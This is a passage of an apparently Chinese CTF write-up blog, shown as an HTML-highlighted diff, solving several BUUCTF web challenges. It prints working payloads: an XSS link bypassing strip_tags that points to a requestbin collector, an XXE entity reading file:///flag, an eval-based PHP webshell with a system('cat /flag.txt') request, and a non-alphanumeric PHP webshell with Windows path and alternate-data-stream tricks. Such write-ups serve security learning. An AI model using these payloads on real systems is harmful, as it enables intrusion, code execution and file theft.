+        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`body: </span><span style=color:#d88200>${</span><span style=color:#75af00>body</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>);</span>
+    <span style=color:#111>}</span>
+    <span style=color:#00a8c8>try</span><span style=color:#111>{</span> 
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>close</span><span style=color:#111>();</span>
+    <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>);</span>
+    <span style=color:#111>}</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#75af00>browser</span><span style=color:#111>;</span>
+<span style=color:#111>};</span>
+
+<span style=color:#00a8c8>function</span> <span style=color:#75af00>handle</span><span style=color:#111>(){</span>
+    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;[+] handle&#34;</span><span style=color:#111>);</span>
+    <span style=color:#75af00>connection</span><span style=color:#111>.</span><span style=color:#75af00>blpop</span><span style=color:#111>(</span><span style=color:#d88200>&#34;query&#34;</span><span style=color:#111>,</span> <span style=color:#ae81ff>0</span><span style=color:#111>,</span> <span style=color:#00a8c8>async</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>,</span> <span style=color:#75af00>message</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>browser</span> <span style=color:#f92672>===</span> <span style=color:#00a8c8>undefined</span><span style=color:#111>)</span> <span style=color:#75af00>browser</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>init</span><span style=color:#111>();</span>
+        <span style=color:#00a8c8>await</span> <span style=color:#75af00>crawl</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://challenge/post.php?id=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>message</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>]);</span>
+        <span style=color:#75af00>setTimeout</span><span style=color:#111>(</span><span style=color:#75af00>handle</span><span style=color:#111>,</span> <span style=color:#ae81ff>10</span><span style=color:#111>);</span> <span style=color:#75715e>// handle next
+</span><span style=color:#75715e></span>    <span style=color:#111>});</span>
+<span style=color:#111>}</span>
+<span style=color:#75af00>handle</span><span style=color:#111>();</span> <span style=color:#75715e>// first ignite
+</span><span style=color:#75715e></span>
+</code></pre></div><p>可以看到有flag，肯定是要xss拿到；admin会先登入admin账号，接着crawl()访问url</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>setUserAgent</span><span style=color:#111>(</span><span style=color:#75af00>flag</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#00a8c8>goto</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>,</span> <span style=color:#111>{</span>
+        <span style=color:#75af00>waitUntil</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;networkidle0&#39;</span><span style=color:#111>,</span>
+        <span style=color:#75af00>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span><span style=color:#111>,</span>
+    <span style=color:#111>});</span>
+    <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>click</span><span style=color:#111>(</span><span style=color:#d88200>&#39;#like&#39;</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>await</span> <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>waitForNavigation</span><span style=color:#111>({</span><span style=color:#75af00>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3000</span><span style=color:#111>});</span>
+<span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>){</span>
+    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>);</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>会点击页面的<code>#like</code>，也就是上面创建Post时勾选的框</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180603461.png alt=image-20220119180603461></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180442910.png alt=image-20220119180442910></p>
+<p>注意到它对标签的过滤，但是允许<code>&lt;audio></code>的存在</p>
+<p>查资料可知<code>strip_tags</code>有安全问题，它不会过滤<code>&lt;a/udio></code>标签，并且<code>&lt;a/udio></code>会作为超链接<code>&lt;a></code>被解析，同时超链接的跳转是不受csp的控制的，payload</p>
+<pre tabindex=0><code>&lt;a/udio id=like href=&quot;http://http.requestbin.buuoj.cn/v4c4pyv4&quot;&gt;aa&lt;/a/udio&gt;
+</code></pre><p>buu改k8s之后内网的题多少有点问题，一直拿不到flag，寄</p>
+</details>
+<details>
+<summary>
+<h4 class=inline>
+[FireshellCTF2020]Cars
+</h4>
+</summary>
+<p>这咋就apk了……算了，摁看</p>
+<p>在Rest.kt中看到三个路由</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119185150236.png alt=image-20220119185150236></p>
+<p>在domain目录下可以看到对应接收的参数格式，/comment可以传入name和message；在CommentActivity中有个<code>send_comment</code>调用了<code>postComment</code></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119190020847.png alt=image-20220119190020847></p>
+<p>这里使用了<code>GsonConvertFactory</code>，这是一个解析json的库，同时这里还引入了<code>retrofit2</code>，给我们xxe的可能</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#75715e>&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+<span style=color:#75715e>&lt;!DOCTYPE foo [
+</span><span style=color:#75715e>   &lt;!ELEMENT foo ANY &gt;</span>
+      <span style=color:#75715e>&lt;!ENTITY xxe SYSTEM  &#34;file:///flag&#34; &gt;</span>
+]&gt;
+<span style=color:#f92672>&lt;Comment&gt;</span>
+    <span style=color:#f92672>&lt;name&gt;</span><span style=color:#111>&amp;xxe;</span><span style=color:#f92672>&lt;/name&gt;</span>
+    <span style=color:#f92672>&lt;message&gt;</span>flag please!<span style=color:#f92672>&lt;/message&gt;</span>
+<span style=color:#f92672>&lt;/Comment&gt;</span>
+</code></pre></div><p>记得修改Content-Type为application/xml</p>
+<p>flag{d96dc7a4-8be4-4e05-9bbf-64fcf8009182}</p>
+</details>
+<details>
+<summary>
+<h4 class=inline>
+[网鼎杯 2020 总决赛]Novel
+</h4>
+</summary>
+<p>只看给的附件，大概扫一下猜测是个反序列化的题；然后看下页面交互，好像跟猜的有一点不太一样，可以选择私藏，会post访问/back/backup，对应的是back.class.php 传入filename和path，选择上传文件会post访问/upload/profile，对应的是upload.class.php</p>
+<p>index.php中关键处在这里</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119223606818.png alt=image-20220119223606818></p>
+<p>back类中除backup外还有三个私有函数<code>_write</code>, <code>_create</code>, <code>random_code </code>，在调用<code>backup</code>时会先依次调用这几个函数进行处理</p>
+<p><code>backup</code>中，首先判断<code>profile/</code>下有没有同名文件，对内容进行<code>htmlspecialchars</code>处理后，先是用<code>random_code</code>生成随机密码，然后进行</p>
+<pre tabindex=0><code>$this-&gt;_write($dest, $this-&gt;_create($password, $content));
+</code></pre><p><code>_create</code>会将密码和内容拼到一起</p>
+<pre tabindex=0><code>private function _create($password, $content){
+   $_content='&lt;?php $_GET[&quot;password&quot;]===&quot;'.$password.'&quot;?print(&quot;'.$content.'&quot;):exit(); ';
+   return $_content;
+}
+</code></pre><p>随后进入<code>_write</code></p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#00a8c8>private</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>_write</span><span style=color:#111>(</span><span style=color:#111>$dest</span><span style=color:#111>,</span> <span style=color:#111>$content</span><span style=color:#111>){</span>
+   <span style=color:#111>$f1</span><span style=color:#f92672>=</span><span style=color:#111>$dest</span><span style=color:#111>;</span>
+   <span style=color:#111>$f2</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;private/&#39;</span><span style=color:#f92672>.</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>random_code</span><span style=color:#111>(</span><span style=color:#ae81ff>10</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#d88200>&#34;.php&#34;</span><span style=color:#111>;</span>
+
+   <span style=color:#111>$stream_f1</span> <span style=color:#f92672>=</span> <span style=color:#75af00>fopen</span><span style=color:#111>(</span><span style=color:#111>$f1</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;w+&#39;</span><span style=color:#111>);</span>
+
+   <span style=color:#75af00>fwrite</span><span style=color:#111>(</span><span style=color:#111>$stream_f1</span><span style=color:#111>,</span> <span style=color:#111>$content</span><span style=color:#111>);</span>
+   <span style=color:#75af00>rewind</span><span style=color:#111>(</span><span style=color:#111>$stream_f1</span><span style=color:#111>);</span>
+   <span style=color:#111>$f1_read</span><span style=color:#f92672>=</span><span style=color:#75af00>fread</span><span style=color:#111>(</span><span style=color:#111>$stream_f1</span><span style=color:#111>,</span> <span style=color:#ae81ff>3000</span><span style=color:#111>);</span>
+   
+   <span style=color:#75af00>preg_match</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/^&lt;\?php \$_GET\[\&#34;password\&#34;\]===\&#34;[a-zA-Z0-9]{8}\&#34;\?print\(\&#34;.*\&#34;\):exit\(\); $/s&#39;</span><span style=color:#111>,</span> <span style=color:#111>$f1_read</span><span style=color:#111>,</span> <span style=color:#111>$matches</span><span style=color:#111>);</span>
+   
+   <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#00a8c8>empty</span><span style=color:#111>(</span><span style=color:#111>$matches</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>])){</span>
+      <span style=color:#75af00>copy</span><span style=color:#111>(</span><span style=color:#111>$f1</span><span style=color:#111>,</span><span style=color:#111>$f2</span><span style=color:#111>);</span>
+      <span style=color:#75af00>fclose</span><span style=color:#111>(</span><span style=color:#111>$stream_f1</span><span style=color:#111>);</span>   
+      <span style=color:#00a8c8>return</span> <span style=color:#111>$f2</span><span style=color:#111>;</span>     
+   <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
+      <span style=color:#75af00>fwrite</span><span style=color:#111>(</span><span style=color:#111>$stream_f1</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&lt;?php exit(); ?&gt;&#39;</span><span style=color:#111>);</span>
+      <span style=color:#75af00>fclose</span><span style=color:#111>(</span><span style=color:#111>$stream_f1</span><span style=color:#111>);</span>
+      <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span><span style=color:#111>;</span>
+   <span style=color:#111>}</span>
+
+<span style=color:#111>}</span>
+</code></pre></div><p>先将<code>$dest</code>和上面<code>_create</code>生成的内容拼一起，然后对内容进行过滤处理，通过过滤的话将会在<code>/private</code>目录下存一份备份文件并返回完整路径，没通过过滤的话会在文件中写入死亡exit</p>
+<p>我们的攻击思路是上传一个txt，之后通过back生成后缀为php的备份文件，拿webshell；构造payload</p>
+<p>amiz.txt</p>
+<pre tabindex=0><code>{${eval($_GET[1])}}
+</code></pre><pre tabindex=0><code>GET /private/mKrZmVugUo.php?password=4lsUOHWN&amp;1=system('cat /flag.txt');
+</code></pre><p>flag{913c1949-edef-4459-8ffc-7970b9c93f14}</p>
+<p>注意这里页面上传的时候要双击submit才会弹出文件管理器</p>
+</details>
+<details>
+<summary>
+<h4 class=inline>
+[Windows]LFI2019
+</h4>
+</summary>
+<p>开幕雷击，直接就是phpinfo的背景，显示是一个windows系统，没有<code>disable_functions</code>也没有<code>open_basedir</code></p>
+<p>有三个按钮，info提示flag在flag.php，upload可以上传文件，include可以包含；给了源码，还挺长的，二百多行</p>
+<p>大多是一些基础操作，防xss, ssrf, session，有几个类比较显眼，首先是Get，它是include时调用的类，会new一个实例然后调用其中的<code>get</code></p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#00a8c8>class</span> <span style=color:#75af00>Get</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>protected</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>nanahira</span><span style=color:#111>(){</span>
+        <span style=color:#75715e>// senpai notice me //
+</span><span style=color:#75715e></span>        <span style=color:#00a8c8>function</span> <span style=color:#75af00>exploit</span><span style=color:#111>(</span><span style=color:#111>$data</span><span style=color:#111>){</span>
+            <span style=color:#111>$exploit</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>System</span><span style=color:#111>();</span>
+        <span style=color:#111>}</span>
+        <span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;trigger&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!@@@@@@@@@@@@@</span><span style=color:#75af00>exploit</span><span style=color:#111>(</span><span style=color:#111>$$$$$$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;leak&#39;</span><span style=color:#111>][</span><span style=color:#d88200>&#39;leak&#39;</span><span style=color:#111>]);</span>
+    <span style=color:#111>}</span>
+    <span style=color:#00a8c8>private</span> <span style=color:#111>$filename</span><span style=color:#111>;</span>
+    <span style=color:#00a8c8>function</span> <span style=color:#111>__construct</span><span style=color:#111>(</span><span style=color:#111>$filename</span><span style=color:#111>){</span>
+        <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>filename</span> <span style=color:#f92672>=</span> <span style=color:#75af00>path_sanitizer</span><span style=color:#111>(</span><span style=color:#111>$filename</span><span style=color:#111>);</span>
+    <span style=color:#111>}</span>
+    <span style=color:#00a8c8>function</span> <span style=color:#75af00>get</span><span style=color:#111>(){</span>
+        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>filename</span> <span style=color:#f92672>===</span> <span style=color:#00a8c8>false</span><span style=color:#111>){</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#111>[</span><span style=color:#d88200>&#34;msg&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;blocked by path sanitizer&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;type&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;error&#34;</span><span style=color:#111>];</span>
+        <span style=color:#111>}</span>
+        <span style=color:#75715e>// wtf???? //
+</span><span style=color:#75715e></span>        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#f92672>!@</span><span style=color:#75af00>file_exists</span><span style=color:#111>(</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>filename</span><span style=color:#111>)){</span>
+            <span style=color:#75715e>// index files are *completely* disabled. //
+</span><span style=color:#75715e></span>            <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>stripos</span><span style=color:#111>(</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>filename</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;index&#34;</span><span style=color:#111>)</span> <span style=color:#f92672>!==</span> <span style=color:#00a8c8>false</span><span style=color:#111>){</span>
+                <span style=color:#00a8c8>return</span> <span style=color:#111>[</span><span style=color:#d88200>&#34;msg&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;you cannot include index files!&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;type&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;error&#34;</span><span style=color:#111>];</span>
+            <span style=color:#111>}</span>
+            <span style=color:#75715e>// hardened sanitizer spawned. thus we sense ambiguity //
+</span><span style=color:#75715e></span>            <span style=color:#111>$read_file</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;./files/&#34;</span> <span style=color:#f92672>.</span> <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>filename</span><span style=color:#111>;</span>
+            <span style=color:#111>$read_file_with_hardened_filter</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;./files/&#34;</span> <span style=color:#f92672>.</span> <span style=color:#75af00>path_sanitizer</span><span style=color:#111>(</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>filename</span><span style=color:#111>,</span> <span style=color:#00a8c8>true</span><span style=color:#111>);</span>
+            <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#111>$read_file</span> <span style=color:#f92672>===</span> <span style=color:#111>$read_file_with_hardened_filter</span> <span style=color:#f92672>||</span>
+                <span style=color:#f92672>@</span><span style=color:#75af00>file_get_contents</span><span style=color:#111>(</span><span style=color:#111>$read_file</span><span style=color:#111>)</span> <span style=color:#f92672>===</span> <span style=color:#f92672>@</span><span style=color:#75af00>file_get_contents</span><span style=color:#111>(</span><span style=color:#111>$read_file_with_hardened_filter</span><span style=color:#111>)){</span>
+                <span style=color:#00a8c8>return</span> <span style=color:#111>[</span><span style=color:#d88200>&#34;msg&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;request blocked&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;type&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;error&#34;</span><span style=color:#111>];</span>
+            <span style=color:#111>}</span>
+            <span style=color:#75715e>// .. and finally, include *un*exploitable file is included. //
+</span><span style=color:#75715e></span>            <span style=color:#f92672>@</span><span style=color:#00a8c8>include</span><span style=color:#111>(</span><span style=color:#d88200>&#34;./files/&#34;</span> <span style=color:#f92672>.</span> <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>filename</span><span style=color:#111>);</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#111>[</span><span style=color:#d88200>&#34;type&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;success&#34;</span><span style=color:#111>];</span>
+        <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#111>[</span><span style=color:#d88200>&#34;msg&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;invalid filename (wtf)&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;type&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;error&#34;</span><span style=color:#111>];</span>
+        <span style=color:#111>}</span>
+    <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>其中对文件名的waf是<code>path_sanitizer</code>，黑名单挺狠的</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#00a8c8>function</span> <span style=color:#75af00>path_sanitizer</span><span style=color:#111>(</span><span style=color:#111>$dir</span><span style=color:#111>,</span> <span style=color:#111>$harden</span><span style=color:#f92672>=</span><span style=color:#00a8c8>false</span><span style=color:#111>){</span>
+    <span style=color:#111>$dir</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span><span style=color:#75af00>string</span><span style=color:#111>)</span><span style=color:#111>$dir</span><span style=color:#111>;</span>
+    <span style=color:#111>$dir_len</span> <span style=color:#f92672>=</span> <span style=color:#75af00>strlen</span><span style=color:#111>(</span><span style=color:#111>$dir</span><span style=color:#111>);</span>
+    <span style=color:#75715e>// Deny LFI/RFI/XSS //
+</span><span style=color:#75715e></span>    <span style=color:#111>$filter</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#39;.&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;./&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;~&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;.\\&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;#&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&lt;&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&gt;&#39;</span><span style=color:#111>];</span>
+    <span style=color:#00a8c8>foreach</span><span style=color:#111>(</span><span style=color:#111>$filter</span> <span style=color:#00a8c8>as</span> <span style=color:#111>$f</span><span style=color:#111>){</span>
+        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>stripos</span><span style=color:#111>(</span><span style=color:#111>$dir</span><span style=color:#111>,</span> <span style=color:#111>$f</span><span style=color:#111>)</span> <span style=color:#f92672>!==</span> <span style=color:#00a8c8>false</span><span style=color:#111>){</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span><span style=color:#111>;</span>
+        <span style=color:#111>}</span>
+    <span style=color:#111>}</span>
+    <span style=color:#75715e>// Deny SSRF and all possible weird bypasses //
+</span><span style=color:#75715e></span>    <span style=color:#111>$stream</span> <span style=color:#f92672>=</span> <span style=color:#75af00>stream_get_wrappers</span><span style=color:#111>();</span>
+    <span style=color:#111>$stream</span> <span style=color:#f92672>=</span> <span style=color:#75af00>array_merge</span><span style=color:#111>(</span><span style=color:#111>$stream</span><span style=color:#111>,</span> <span style=color:#75af00>stream_get_transports</span><span style=color:#111>());</span>
+    <span style=color:#111>$stream</span> <span style=color:#f92672>=</span> <span style=color:#75af00>array_merge</span><span style=color:#111>(</span><span style=color:#111>$stream</span><span style=color:#111>,</span> <span style=color:#75af00>stream_get_filters</span><span style=color:#111>());</span>
+    <span style=color:#00a8c8>foreach</span><span style=color:#111>(</span><span style=color:#111>$stream</span> <span style=color:#00a8c8>as</span> <span style=color:#111>$f</span><span style=color:#111>){</span>
+        <span style=color:#111>$f_len</span> <span style=color:#f92672>=</span> <span style=color:#75af00>strlen</span><span style=color:#111>(</span><span style=color:#111>$f</span><span style=color:#111>);</span>
+        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>substr</span><span style=color:#111>(</span><span style=color:#111>$dir</span><span style=color:#111>,</span> <span style=color:#ae81ff>0</span><span style=color:#111>,</span> <span style=color:#111>$f_len</span><span style=color:#111>)</span> <span style=color:#f92672>===</span> <span style=color:#111>$f</span><span style=color:#111>){</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span><span style=color:#111>;</span>
+        <span style=color:#111>}</span>
+    <span style=color:#111>}</span>
+    <span style=color:#75715e>// Deny length //
+</span><span style=color:#75715e></span>    <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#111>$dir_len</span> <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>128</span><span style=color:#111>){</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span><span style=color:#111>;</span>
+    <span style=color:#111>}</span>
+	<span style=color:#75715e>// Easy level hardening //
+</span><span style=color:#75715e></span>	<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#111>$harden</span><span style=color:#111>){</span>
+		<span style=color:#111>$harden_filter</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#34;/&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;</span><span style=color:#8045ff>\\</span><span style=color:#d88200>&#34;</span><span style=color:#111>];</span>
+		<span style=color:#00a8c8>foreach</span><span style=color:#111>(</span><span style=color:#111>$harden_filter</span> <span style=color:#00a8c8>as</span> <span style=color:#111>$f</span><span style=color:#111>){</span>
+			<span style=color:#111>$dir</span> <span style=color:#f92672>=</span> <span style=color:#75af00>str_replace</span><span style=color:#111>(</span><span style=color:#111>$f</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>,</span> <span style=color:#111>$dir</span><span style=color:#111>);</span>
+		<span style=color:#111>}</span>
+	<span style=color:#111>}</span>
+    <span style=color:#75715e>// Sanitize feature is available starting from the medium level //
+</span><span style=color:#75715e></span>    <span style=color:#00a8c8>return</span> <span style=color:#111>$dir</span><span style=color:#111>;</span>
+<span style=color:#111>}</span>
+</code></pre></div><p><code>$filename</code>单独经过waf之后得到的文件路径<code>$read_file_with_hardened_filter</code>必须和之前的<code>$read_file</code>不同，读到的文件内容也必须不同</p>
+<p>post的地方用的是Put类，大差不差，多了个对code的waf，<code>code_sanitizer</code></p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#00a8c8>function</span> <span style=color:#75af00>code_sanitizer</span><span style=color:#111>(</span><span style=color:#111>$code</span><span style=color:#111>){</span>
+    <span style=color:#75715e>// Computer-chan, please don&#39;t speak english. Speak something else! //
+</span><span style=color:#75715e></span>    <span style=color:#111>$code</span> <span style=color:#f92672>=</span> <span style=color:#75af00>preg_replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-</span><span style=color:#8045ff>\\</span><span style=color:#d88200>\&#39;</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>\=\(\)\[\]\;]/u&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;*Nope*&#34;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>string</span><span style=color:#111>)</span><span style=color:#111>$code</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>$code</span><span style=color:#111>;</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>正常linux下写入<code>test</code>文件，包含<code>test\</code>，经过waf之后得到<code>./files/test</code>，但是处理前的<code>./files/test\</code>无法读取文件内容，失败</p>
+<p>这里用到的trick是windows下执行<code>file_get_contents</code>时会把<code>"</code>解释为<code>.</code></p>
+<pre tabindex=0><code>file_get_contents('test.php') === file_get_contents('test&quot;php')
+</code></pre><p>利用这个trick，上传文件名为<code>test</code>，读取文件名为<code>"/test</code>，过waf后路径为<code>./files/.test</code>，处理前路径为<code>./files/./test</code>，可以正常读取文件内容</p>
+<p>关于shell，继续用p牛的这篇<a href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html>一些不包含数字和字母的webshell</a></p>
+<pre tabindex=0><code>&lt;?=$_=[];$_=&quot;$_&quot;;$_=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.'.'.$____.$_____.$____;$__($___);?&gt;
+</code></pre><p>注意对<code>+</code>进行url编码</p>
+<p>flag{f5bf0f29-bb51-4f28-b9ee-d9ef9b1e3915}</p>
+<p>————之后看更多师傅们的wp，发现由于是win的环境还可以有别的trick来利用</p>
+<p>win下有磁盘流创建目录的方式</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/298354/1572187075689-2a8c066f-5c30-4f23-9f1f-fd564d4f87f1.png#align=left&display=inline&height=208&name=%E5%9B%BE%E7%89%87.png&originHeight=415&originWidth=900&size=248114&status=done&width=450" alt=图片.png></p>
+<p>当<code>file_put_contents</code>传入的文件名为<code>amiz::$INDEX_ALLOCATION</code>时 就会在当前文件夹下创建一个名为<code>amiz</code>的文件夹，内容为空</p>
+<p>我们先用put创建文件夹，再put向这个文件夹下写shell，最后包含这个文件夹下的shell就可以了</p>
